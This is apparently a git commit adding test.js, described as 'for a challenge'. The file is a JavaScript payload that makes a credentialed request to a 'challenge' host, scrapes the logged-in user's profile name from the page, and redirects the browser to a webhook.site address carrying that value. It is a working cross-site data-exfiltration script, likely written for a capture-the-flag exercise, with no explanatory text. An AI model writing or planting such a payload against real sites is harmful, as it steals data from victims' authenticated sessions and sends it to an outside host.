128214c790cc67e560e62fc46ede57e5f4de97a6
el-queso <gtiritidis@gmail.com>
2022-09-03 14:37:56 +0300

    for a challenge

---
+++ test.js
@@ -0,0 +1,10 @@
+var r = new XMLHttpRequest();
+r.open("GET", "http://challenge:8080/", true); 
+r.onreadystatechange = function() { 
+    if (r.readyState == 4){
+        var res = r.response.split('\'s Profile')[0].split('<h1>')[1].replace(/\s/g, '');
+        window.location = 'https://webhook.site/2bc172cc-3fe7-4c42-875a-366c0ab4699c/q=' + res;
+    }
+};
+r.withCredentials = true;
+r.send();
